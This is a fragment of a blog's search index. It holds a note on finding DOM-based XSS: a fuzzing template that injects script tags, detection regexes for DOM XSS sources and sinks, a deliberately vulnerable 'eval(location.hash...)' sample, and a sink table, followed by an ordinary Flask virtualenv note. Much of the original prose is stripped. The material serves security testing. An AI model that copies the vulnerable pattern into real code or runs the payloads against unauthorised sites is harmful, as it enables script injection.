  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing...&lt;/h3&gt;</span><br><span class="line">&lt;fuzz&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;</span><br><span class="line">&lt;/fuzz&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>fuzzing</p><h3 id="DOM-XSS-"><a href="#DOM-XSS-" class="headerlink" title="DOM XSS "></a>DOM XSS </h3><ol><li><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Finding Sources</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sources (BETA):</span><br><span class="line"></span><br><span class="line">/(location\s*[\[.])|([.\[]\s*[&quot;&apos;]?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/</span><br><span class="line"></span><br><span class="line">Finding Sinks</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sinks (BETA):</span><br><span class="line"></span><br><span class="line">/((src|href|data|location|code|value|action)\s*[&quot;&apos;\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;&apos;\]]*\s*\()/</span><br><span class="line"></span><br><span class="line">This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:</span><br><span class="line"></span><br><span class="line">/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</a><br></p><ol start="2"><li><br>Javascript<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><p>DOM XSS</p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>Firefox#fuzzingfuzzing<code>var x=&#39;d0mx55&#39;</code><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var _eval=eval;</span><br><span class="line">eval=function(x)&#123;</span><br><span class="line">if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125;</span><br><span class="line">if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;);</span><br><span class="line">_eval(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>javascriptinnerHTML<code>__defineSetter__</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);</span><br><span class="line">window.x=&apos;xxxxxYYYYYYYY&apos;;</span><br></pre></td></tr></table></figure></p><p>xSetterinnerHTMLinnerHTML<code>__defineSetter__</code>,DOM XSS</p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>FirefoxDOM<code>document.write(&#39;d0m&#39;+&#39;x55&#39;)</code>d0mx55<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123;</span><br><span class="line">alert(&apos;found dom xss&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>DOM</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><table><thead><tr><th></th><th>javascript code</th></tr></thead><tbody><tr><td>HTML</td><td>document.write()<br>document.writeln()<br> document.body.innerHtml=</td></tr><tr><td>DOMDHTML</td><td>document.forms[0].action=<br>document.attachEvent()<br>document.create()<br>document.execCommand()<br>document.body. <br>widow.attachEvent()</td></tr><tr><td>document url</td><td>document.location=(locationhref,host,hostname)<br>document.location.hostname=<br>document.location.replace()<br>document.location.assign()<br>documnent.URL=<br>window.navigate()</td></tr><tr><td></td><td>document.open()<br>window.open()<br>window.location.href=(locationhref,host,hostname)</td></tr><tr><td></td><td>eval()<br>window.execScript()<br>window.setInterval()<br>window.setTimeout()</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OTHERSflask virtualenv</title>
      <link href="2016/03/16/old-old-flask-virtualenv/"/>
      <url>2016/03/16/old-old-flask-virtualenv/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>python virtualenvflaskwebpythonpythonpython<br><a id="more"></a></p><h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>pipeasy_install<a href="https://pypi.python.org/pypi/virtualenv" target="_blank" rel="noopener">virtualenv.py</a><br>pip <code>pip install virtualenv</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br>dos <code>virtualenv venv</code> venvpythonpython.exepipeasy_installpython</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>dospythonvenvpip<br><code>Scripts\activate   </code><br><code>deactivate  </code><br>venv<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\code\python-workplace\flasker\venv&gt;Scripts\activate</span><br><span class="line">(venv) E:\code\python-workplace\flasker\venv&gt;</span><br></pre></td></tr></table></figure></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>pip install xxxx</code>venv</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>venvsys.pathpython<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">importos,sys</span><br><span class="line">sys.path.append(os.getcwd()+<span class="string">'\\venv\\Lib\\site-packages'</span>)</span><br></pre></td></tr></table></figure></p><p>python<br><strong>==The End==</strong></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
